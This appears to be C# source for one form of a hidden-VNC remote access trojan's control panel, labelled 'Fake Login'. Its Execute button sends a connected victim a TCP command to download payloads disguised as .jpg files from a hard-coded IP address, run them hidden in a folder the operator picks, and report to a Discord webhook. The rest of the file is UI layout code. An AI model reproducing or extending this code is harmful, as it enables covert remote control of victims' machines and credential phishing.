using System;
using System.ComponentModel;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace ShitarusPrivate.HVNC
{
    public class IWhoamiN : Form
    {
        private IContainer components;

        private PrimeTheme primeTheme1;

        private ComboBox comboBox1;

        private CheckBox checkBox1;

        private StudioButton btnDHelp;

        private PrimeButton btnExec;

        private GroupBox groupBox2;

        private Label label5;

        private TextBox txtHook;

        private Label label3;

        private PictureBox pictureBox1;

        private StudioButton studioButton5;

        public IWhoamiN()
        {
            InitializeComponent();
        }

        public void SendTCP(object object_0, TcpClient tcpClient_0)
        {
            if (object_0 == null)
            {
                return;
            }
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
            binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
            binaryFormatter.FilterLevel = TypeFilterLevel.Full;
            checked
            {
                lock (tcpClient_0)
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                    ulong num = 0uL;
                    MemoryStream memoryStream = new MemoryStream();
                    binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                    num = (ulong)memoryStream.Position;
                    tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                    byte[] buffer = memoryStream.GetBuffer();
                    tcpClient_0.GetStream().Write(buffer, 0, (int)num);
                    memoryStream.Close();
                    memoryStream.Dispose();
                }
            }
        }

        private void btnDHelp_Click_1(object sender, EventArgs e)
        {
            HelpDisc helpDisc = new HelpDisc();
            helpDisc.ShowDialog();
        }

        private void btnExec_Click_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                SendTCP("55*http://193.31.116.239/crypt/public/Update_Downloads/patata.jpg*" + txtHook.Text.ToString() + "*" + comboBox1.SelectedIndex + "*http://193.31.116.239/crypt/public/Update_Downloads/vfect.jpg", (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("55*http://193.31.116.239/crypt/public/Update_Downloads/patata.jpg*" + txtHook.Text.ToString() + "*" + comboBox1.SelectedIndex + "*http://193.31.116.239/crypt/public/Update_Downloads/vfect.jpg", (TcpClient)base.Tag);
            }
            Close();
        }

        private void studioButton5_Click_1(object sender, EventArgs e)
        {
            Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.IWhoamiN));
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            this.primeTheme1 = new PrimeTheme();
            this.studioButton5 = new StudioButton();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.btnDHelp = new StudioButton();
            this.btnExec = new PrimeButton();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.label5 = new System.Windows.Forms.Label();
            this.txtHook = new System.Windows.Forms.TextBox();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            this.groupBox2.SuspendLayout();
            base.SuspendLayout();
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.comboBox1);
            this.primeTheme1.Controls.Add(this.checkBox1);
            this.primeTheme1.Controls.Add(this.btnDHelp);
            this.primeTheme1.Controls.Add(this.btnExec);
            this.primeTheme1.Controls.Add(this.groupBox2);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(800, 338);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 0;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom11.Name = "DownGradient1";
            bloom11.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom12.Name = "DownGradient2";
            bloom12.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom13.Name = "NoneGradient1";
            bloom13.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom14.Name = "NoneGradient2";
            bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom15.Name = "Shine1";
            bloom15.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom16.Name = "Shine2A";
            bloom16.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom17.Name = "Shine2B";
            bloom17.Value = System.Drawing.Color.Transparent;
            bloom18.Name = "Shine3";
            bloom18.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom20.Name = "Text";
            bloom20.Value = System.Drawing.Color.White;
            bloom21.Name = "Glow";
            bloom21.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom22.Name = "Border";
            bloom22.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom23.Name = "Corners";
            bloom23.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[13]
            {
                bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
                bloom21, bloom22, bloom23
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(774, -5);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 77;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(studioButton5_Click_1);
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.ForeColor = System.Drawing.Color.Black;
            this.label3.Location = new System.Drawing.Point(38, 13);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(86, 16);
            this.label3.TabIndex = 76;
            this.label3.Text = "Fake Login";
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(1, -2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(51, 48);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 75;
            this.pictureBox1.TabStop = false;
            this.comboBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[5] { "Desktop", "Local", "Program Files", "Roaming", "Temp" });
            this.comboBox1.Location = new System.Drawing.Point(630, 220);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(130, 21);
            this.comboBox1.TabIndex = 74;
            this.comboBox1.Text = "Temp";
            this.checkBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.checkBox1.AutoSize = true;
            this.checkBox1.Checked = true;
            this.checkBox1.CheckState = System.Windows.Forms.CheckState.Checked;
            this.checkBox1.Location = new System.Drawing.Point(491, 228);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(91, 17);
            this.checkBox1.TabIndex = 73;
            this.checkBox1.Text = "Run Hidden";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.btnDHelp.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.btnDHelp.BackColor = System.Drawing.Color.Transparent;
            bloom24.Name = "DownGradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom25.Name = "DownGradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom26.Name = "NoneGradient1";
            bloom26.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom27.Name = "NoneGradient2";
            bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom28.Name = "Shine1";
            bloom28.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom29.Name = "Shine2A";
            bloom29.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom30.Name = "Shine2B";
            bloom30.Value = System.Drawing.Color.Transparent;
            bloom31.Name = "Shine3";
            bloom31.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom32.Name = "TextShade";
            bloom32.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom33.Name = "Text";
            bloom33.Value = System.Drawing.Color.White;
            bloom34.Name = "Glow";
            bloom34.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom35.Name = "Border";
            bloom35.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom36.Name = "Corners";
            bloom36.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnDHelp.Colors = new Bloom[13]
            {
                bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
                bloom34, bloom35, bloom36
            };
            this.btnDHelp.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnDHelp.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnDHelp.Image = null;
            this.btnDHelp.Location = new System.Drawing.Point(41, 220);
            this.btnDHelp.Name = "btnDHelp";
            this.btnDHelp.NoRounding = false;
            this.btnDHelp.Size = new System.Drawing.Size(108, 30);
            this.btnDHelp.TabIndex = 72;
            this.btnDHelp.Text = "Discord Help";
            this.btnDHelp.Transparent = true;
            this.btnDHelp.Click += new System.EventHandler(btnDHelp_Click_1);
            this.btnExec.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            bloom37.Name = "DownGradient1";
            bloom37.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom38.Name = "DownGradient2";
            bloom38.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom39.Name = "NoneGradient1";
            bloom39.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom40.Name = "NoneGradient2";
            bloom40.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom41.Name = "NoneGradient3";
            bloom41.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom42.Name = "NoneGradient4";
            bloom42.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom43.Name = "Glow";
            bloom43.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom44.Name = "TextShade";
            bloom44.Value = System.Drawing.Color.White;
            bloom45.Name = "Text";
            bloom45.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom46.Name = "Border1";
            bloom46.Value = System.Drawing.Color.White;
            bloom47.Name = "Border2";
            bloom47.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.btnExec.Colors = new Bloom[11]
            {
                bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
                bloom47
            };
            this.btnExec.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btnExec.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnExec.Image = null;
            this.btnExec.Location = new System.Drawing.Point(583, 270);
            this.btnExec.Name = "btnExec";
            this.btnExec.NoRounding = false;
            this.btnExec.Size = new System.Drawing.Size(177, 39);
            this.btnExec.TabIndex = 71;
            this.btnExec.Text = "Execute";
            this.btnExec.Transparent = false;
            this.btnExec.Click += new System.EventHandler(btnExec_Click_1);
            this.groupBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.groupBox2.Controls.Add(this.label5);
            this.groupBox2.Controls.Add(this.txtHook);
            this.groupBox2.Location = new System.Drawing.Point(42, 65);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(718, 152);
            this.groupBox2.TabIndex = 70;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Discord";
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(97, 78);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(64, 13);
            this.label5.TabIndex = 59;
            this.label5.Text = "Webhook:";
            this.txtHook.Location = new System.Drawing.Point(167, 61);
            this.txtHook.Multiline = true;
            this.txtHook.Name = "txtHook";
            this.txtHook.Size = new System.Drawing.Size(454, 30);
            this.txtHook.TabIndex = 58;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(800, 338);
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "IWhoamiN";
            this.Text = "IWhoamiN";
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            base.ResumeLayout(false);
        }
    }
}
